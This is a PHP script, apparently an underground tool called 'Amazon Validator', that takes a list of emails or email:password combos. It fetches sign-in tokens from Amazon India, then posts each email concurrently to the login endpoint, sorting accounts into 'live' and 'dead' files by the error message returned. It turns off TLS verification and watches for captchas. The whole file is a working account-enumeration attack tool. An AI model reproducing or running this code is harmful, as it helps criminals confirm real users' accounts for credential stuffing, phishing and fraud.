<?php 
error_reporting(0);
ini_set("memory_limit", '-1');
date_default_timezone_set("Asia/Jakarta");
define("OS", strtolower(PHP_OS));

require_once "RollingCurl/RollingCurl.php";
require_once "RollingCurl/Request.php";

echo banner();
//$checkUser = checkUser();
enterlist:
$listname = readline(" * [ Enter Your List ]	:  ");
if(empty($listname) || !file_exists($listname)) {
	echo" [?] list not found".PHP_EOL;
	goto enterlist;
}
$lists = array_unique(explode("\n", str_replace("\r", "", file_get_contents($listname))));
$savedir = readline(" * [ Save Results ]	:     ");
$dir = empty($savedir) ? "valid" : $savedir;
if(!is_dir($dir)) mkdir($dir);
chdir($dir);
reqemail:
$reqemail = readline(" * [ Ratio Check / S ]  : ");
$reqemail = (empty($reqemail) || !is_numeric($reqemail) || $reqemail <= 0) ? 3 : $reqemail;
if($reqemail > 80) {
	echo " [*] max 80".PHP_EOL;
	goto reqemail;
}
$delpercheck = readline(" * [ Delete list per check (y/n) ]  : ");
$delpercheck = strtolower($delpercheck) == "y" ? true : false;

$no = 0;
$total = count($lists);
$live = 0;
$dead = 0;
$unknown = 0;
$c = 0;

echo PHP_EOL;
$getdata = getData();
if(!is_array($getdata) && $getdata == "captcha") die(PHP_EOL."* CAPTCHA".PHP_EOL);
$rollingCurl = new \RollingCurl\RollingCurl();
foreach($lists as $list) {
	$c++;
	if(strpos($list, "|") !== false) list($email, $pwd) = explode("|", $list);
	else if(strpos($list, ":") !== false) list($email, $pwd) = explode(":", $list);
	else $email = $list;
	if(empty($email)) continue;
	if($c%60000==0) {
		if(file_exists(dirname(__FILE__)."/../amzval.cook")) unlink(dirname(__FILE__)."/../amzval.cook");
		$getdata = getData();
	}
	$email = str_replace(" ", "", $email);
	$header = array("accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding: gzip, deflate, br","accept-language: en-US,en;q=0.9","cache-control: max-age=0","content-type: application/x-www-form-urlencoded","origin: https://www.amazon.in","referer: https://www.amazon.in/ap/signin?openid.pape.max_auth_age=900&openid.return_to=https%3A%2F%2Fwww.amazon.in%2Fap%2Fcnep%3Fie%3DUTF8%26orig_return_to%3Dhttps%253A%252F%252Fwww.amazon.in%252Fgp%252Fcss%252Faccount%252Finfo%252Fview.html%253Fie%253DUTF8%2526ref_%253Dhp_ss_cnep%26openid.assoc_handle%3Dinamazon%26pageId%3Dinamazon&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inamazon&openid.mode=checkid_setup&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0","upgrade-insecure-requests: 1","user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.118");
	$data = "openid.return_to=".$getdata["openidreturnto"]."&prevRID=".$getdata["prevrid"]."&workflowState=".$getdata["workflowstate"]."&appActionToken=".$getdata["appactiontoken"]."&appAction=SIGNIN_PWD_COLLECT&email=".$email."&password=&create=0";
	$rollingCurl->setOptions(array(CURLOPT_RETURNTRANSFER => 1, CURLOPT_ENCODING => "gzip", CURLOPT_COOKIEJAR => dirname(__FILE__)."/../amzval.cook", CURLOPT_COOKIEFILE => dirname(__FILE__)."/../amzval.cook", CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4))->post("https://www.amazon.in/ap/signin?email=".$email."&list=".$list, $data, $header);
}
$rollingCurl->setCallback(function(\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$results) {
	global $listname, $dir, $delpercheck, $no, $total, $live, $dead, $unknown;
	$no++;
	parse_str(parse_url($request->getUrl(), PHP_URL_QUERY), $params);
	$email = $params["email"];
	$list = $params["list"];
	$x = $request->getResponseText();
	$deletelist = 1;
	echo " [".date("H:i:s")." ".$no."/".$total." from ".$listname." to ".$dir."] [ Peler ]";
	if(preg_match("#We cannot find an account with that email address#", $x)) {
		$dead++;
		file_put_contents("dead.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["RED"]." DEAD => ".color()["WH"].$email;
	}else{
		$live++;
		file_put_contents("live-".date('d-m-Y').".txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["GR"]." LIVE => ".color()["WH"].$email;
	}
	echo " | Amazon eMail Validator 1.0 --";
	if($delpercheck && $deletelist) {
    	$getfile = file_get_contents("../".$listname);
    	$awal = str_replace("\r", "", $getfile);
    	$akhir = str_replace($list."","", "", $awal);
    	file_put_contents("../".$listname, $akhir);
	}
	echo PHP_EOL;
})->setSimultaneousLimit((int) $reqemail)->execute();
if($delpercheck && count(explode("\n", file_get_contents("../".$listname))) <= 1) unlink("../".$listname);
echo PHP_EOL." -- Total: ".$total." - Live: ".$live." - Dead: ".$dead." - Unknown: ".$unknown.PHP_EOL." Saved to dir \"".$dir."\"".PHP_EOL;

function banner(){
	echo "
				".color()["RED"]." __  __    __ __  
				".color()["RED"]."|__)|_ |  |_ |__) 
				".color()["WH"]."|   |__|__|__| \  
                  
";
	echo color()["RED"]."--------------------------------------------------------------------------------\n";
	echo color()["PUR"]."                              [ Amazon Validator V.1.2 ] \n";
	echo color()["PUR"]."                    [ Made with {coffee} and {heart} by Nicsx ] \n";
	echo color()["CY"]."--------------------------------------------------------------------------------\n";
	echo " \n";
	echo color()["GRB"]."                       Work As Hard As You Can Until You Succeed\n";
	echo color()["BL"]."             Until One Day Your Neighbors Think It Is The Result Of Stealing\n";
		echo " \n";
	echo color()["RED"].'---------------------------- [ '.date("d M Y | h:i").' ] ----------------------------';
	echo color()["WH"]."\n";
    echo "\n";
    }    
function color() {
	return array(
		"WH" => "\e[0;37m",
		"YL" => "\e[1;33m",
		"RED" => "\e[1;31m",
		"PUR" => "\e[0;35m",
		"CY" => "\e[0;36m",
		"GR" => "\e[1;32m",
		"GRB" => "\e[0;32m",
		"BL" => "\e[1;34m",
		"LR" => "\e[1;31m",
		"LW" => "\e[1;37m"
	);
}
/*
function checkUser(){
	$ch = curl_init();
	$a = file_get_contents('token.txt');
	echo color()["YL"]."[?][>] Verifying your access token";
		for ($i=0 ; $i<=4 ; $i++) {
    		echo '.';    
    		usleep(600000);          
	};
	curl_setopt($ch, CURLOPT_URL, "https://peler-protection.com/index.php/check/user?api=".$a);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	$nako = curl_exec($ch);
	$b = json_decode($nako, true);
	$pepek = $b[0]['status'];
	if($pepek == ""){
		echo "\nINVALID API KEY".PHP_EOL;
		exit;
	} 
	if($pepek == "live"){
		echo "\nAPI KEY VALID - SILAHKAN CEK SEPUAS BAPAKKAU ANJING!!!".PHP_EOL;
	}
	curl_close($ch);
	return $nako;
}
*/
function getData() {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://www.amazon.in/gp/css/account/info/view.html?ie=UTF8&ref_=hp_ss_cnep");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__)."/../amzval.cook");
	curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__)."/../amzval.cook");
	curl_setopt($ch, CURLOPT_ENCODING, "gzip");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
	$x = curl_exec($ch);
	curl_close($ch);
	if(preg_match("#Robot Check#", $x)) return "captcha";
	$out = array();
	$out["openidreturnto"] = getStr($x, "openid.return_to\" value=\"", "\"");
	$out["workflowstate"] = getStr($x, "workflowState\" value=\"", "\"");
	$out["appactiontoken"] = getStr($x, "appActionToken\" value=\"", "\"");
	$out["prevrid"] = getStr($x, "prevRID\" value=\"", "\"");
	return $out;
}
function getStr($source, $start, $end) {
    $a = explode($start, $source);
    $b = explode($end, $a[1]);
    return $b[0];
}
function curl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $x = curl_exec($ch);
    curl_close($ch);
    return $x;
}